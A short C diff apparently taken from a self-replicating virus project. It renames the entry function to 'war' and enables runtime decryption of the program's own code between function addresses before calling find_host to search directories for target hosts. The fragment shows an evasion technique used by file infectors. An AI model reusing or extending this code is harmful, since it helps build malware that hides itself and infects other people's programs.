@@ -4,7 +4,7 @@
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void init(struct s_host *host, struct s_keychain *keychain, enum e_context context)
+void war(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
 	void *dir;
 	size_t size;
@@ -32,8 +32,8 @@ void init(struct s_host *host, struct s_keychain *keychain, enum e_context conte
 		size = sizeof(user) / sizeof(user[0]);
 	}
 
-//	update_keychain_left(&keychain, (char *)__entry, (void *)find_host - (void *)__entry);
-//	decrypt_left(&keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
+	update_keychain_right(keychain, (char *)war, (void *)find_host - (void *)war);
+	decrypt_right(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
 
 	find_host(host, keychain, dir, size, context);
 }
